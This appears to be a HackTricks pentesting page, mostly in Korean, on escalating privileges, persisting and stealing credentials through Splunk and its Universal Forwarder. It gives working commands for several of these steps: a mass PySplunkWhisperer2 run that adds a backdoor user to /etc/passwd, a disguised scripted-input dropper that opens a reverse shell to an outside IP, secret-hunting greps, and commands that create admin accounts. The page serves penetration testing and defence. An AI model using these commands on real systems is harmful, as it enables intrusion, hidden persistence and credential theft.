# Splunk LPE and Persistence

{{#include ../../banners/hacktricks-training.md}}

만약 **내부적으로** 또는 **외부적으로** machine을 **enumerating**하다가 **Splunk running**을 발견하면(보통 **web UI**는 **8000**, **management API**는 **8089**), 유효한 credentials는 종종 app installation, scripted inputs, 또는 management actions를 통해 **code execution**으로 이어질 수 있습니다. Splunk가 **root**로 실행 중이라면, 이는 흔히 즉시적인 **privilege escalation**이 됩니다.

일반적인 remote attack surface, enumeration, 또는 app-upload RCE path만 필요하다면, 다음을 확인하세요:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

이미 **root**이고 Splunk service가 localhost에만 listen하지 않는다면, **Splunk password hashes**를 훔치거나, **encrypted secrets**를 복구하거나, **malicious app**을 푸시해서 로컬 또는 여러 forwarder 전반에 걸쳐 persistence를 유지할 수도 있습니다.

## Interesting Local Files

Splunk 또는 Splunk Universal Forwarder가 실행 중인 host에 도달했다면, 보통 다음 path들이 가장 interesting합니다:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
중요한 artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: local Splunk users and password hashes.
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Splunk가 여러 `.conf` 파일에 저장된 secrets를 암호화하는 데 사용하는 key.
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: 초기 admin bootstrap 파일; gold images와 provisioning mistakes에서 유용함. `etc/passwd`가 이미 존재하면 무시됨.
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted inputs가 일반적으로 활성화되는 위치.
- **`$SPLUNK_HOME/etc/deployment-apps/`** 또는 **`$SPLUNK_HOME/etc/apps/`**: persistent app을 숨기거나 이미 배포 중인 내용을 검토하기 좋은 위치.

## Splunk Universal Forwarder Agent Exploit Summary

자세한 내용은 [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)를 확인하세요. 이는 요약입니다:

**Exploit overview:**
Splunk Universal Forwarder(UF)를 대상으로 하는 exploit은 **agent password**를 가진 attacker가 agent가 실행 중인 시스템에서 arbitrary code를 실행할 수 있게 하며, 잠재적으로 환경의 큰 부분을 compromise할 수 있습니다.

**Why it works:**

- UF management service는 보통 **TCP 8089**에서 노출됩니다.
- Attackers는 API에 authenticate하고 forwarder에게 **malicious app bundle**을 설치하도록 지시할 수 있습니다.
- 같은 primitive는 로컬에서는 **LPE**에, 원격에서는 **RCE**에 사용할 수 있습니다.
- **SplunkWhisperer2** 같은 public tooling은 app bundle을 자동으로 생성하며 Linux targets에 맞게 payload를 조정할 수 있습니다.

**Common ways to recover the password:**

- documentation, scripts, shares, 또는 deployment automation에 있는 cleartext credentials.
- `$SPLUNK_HOME/etc/passwd` 안의 password hashes를 offline cracking으로 이어서 획득.
- `user-seed.conf` 같은 golden images 또는 provisioning leftovers.

**Impact:**

- 침해된 각 host에서 SYSTEM/root 수준의 code execution.
- persistent apps, backdoors, 또는 ransomware 배포.
- 데이터가 forwarded 되기 전에 telemetry를 비활성화하거나 조작.

**Example command for exploitation:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**사용 가능한 public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs 또는 Malicious Apps를 통한 Persistence

`root`/`splunk`로 **filesystem write access**가 있거나, apps를 설치할 수 있는 authenticated access가 있다면, 매우 신뢰할 수 있는 persistence mechanism은 **scripted input**이 포함된 **custom app**을 drop하는 것이다. Splunk의 공식 문서도 scripted inputs가 app directory 아래에 존재하고 `inputs.conf`에서 enable되기를 기대한다.

Typical layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
빠른 Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notes:

- The same trick works on **Universal Forwarder** using `/opt/splunkforwarder/etc/apps/`.
- Attackers often blend in by modifying a legitimate add-on instead of creating an obviously malicious app.
- On a **deployment server**, planting a malicious app inside `deployment-apps/` turns into **fleet-wide persistence** because forwarders poll, download updated apps, and often restart to apply them.

## Credential Theft and Admin Takeover

If you can read Splunk's local files, there are usually two good goals: recover **Splunk admin access** and recover **encrypted service credentials**.

### Password hashes and local users

Splunk stores local authentication data in `etc/passwd`. Depending on the deployment, cracking that file can recover working credentials for the web UI and the management API.

If you already have valid **admin** credentials and Splunk uses its **native** authentication backend, the CLI itself can be used for persistence:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` and encrypted values

Splunk는 여러 configuration files에 저장된 민감한 값을 보호하기 위해 `etc/auth/splunk.secret`을 사용합니다. **secret**과 관련된 **`.conf` files**를 모두 훔칠 수 있다면, 종종 다음 값을 복구하거나 재사용할 수 있습니다:

- `pass4SymmKey` 같은 forwarder/indexer shared secrets
- `sslPassword` 같은 TLS private-key passwords
- `bindDNPassword` 같은 LDAP bind credentials

이는 Splunk admin password 자체를 크랙할 수 없더라도 **lateral movement**에 유용합니다.

### `user-seed.conf` abuse

`user-seed.conf`는 첫 시작 시에만, 또는 `etc/passwd`가 존재하지 않을 때만 사용됩니다. 그래서 live box에서는 덜 유용하지만, 다음 환경에서는 매우 흥미롭습니다:

- compromised installation templates
- container images
- unattended provisioning workflows
- Splunk가 자동으로 재초기화되는 appliances

그런 경우 `splunk hash-passwd`로 생성한 `HASHED_PASSWORD`를 심어 두면, 재배포 후 조용히 admin access를 되찾을 수 있습니다.

## Abusing Splunk Queries

자세한 내용은 [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)를 확인하세요.

유용한 최근 technique은 취약한 Splunk Enterprise 버전에서 **user-supplied XSLT**를 악용해, 낮은 권한의 authenticated account를 `splunk` user 권한의 **OS command execution**으로 바꾸는 것입니다.

고수준 흐름:

1. Splunk에 authenticate합니다.
2. 취약한 **XSL** 파일을 preview/upload functionality를 통해 업로드합니다.
3. Splunk가 **dispatch** directory의 업로드된 stylesheet로 search results를 render하게 만듭니다.
4. XSLT payload를 사용해 파일을 쓰거나, Splunk의 search pipeline을 통해 execution을 트리거합니다(예: `runshellscript` 같은 internal functionality에 도달).

중요한 offensive takeaway는 이 경로가 **app upload 없이 가능한 post-auth RCE**라는 점입니다. Linux에서는 보통 **`splunk`** account로 떨어지며, 이 사용자도 application tree를 소유하는 경우가 많고, secrets를 읽을 수 있으며, shell loss 이후에도 살아남는 persistent apps를 심을 수 있어 여전히 가치가 큽니다.

exploitation 중 사용된 대표적인 path는 다음과 같습니다:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk가 너무 많은 권한으로 실행되거나, `splunk` 사용자에게 위험한 scripts, writable service units, 또는 잘못된 `sudo` rules에 대한 접근 권한이 있으면, 이는 깔끔한 **LPE** chain이 됩니다.

## References

- [https://advisory.splunk.com/advisories/SVD-2023-1104](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
{{#include ../../banners/hacktricks-training.md}}
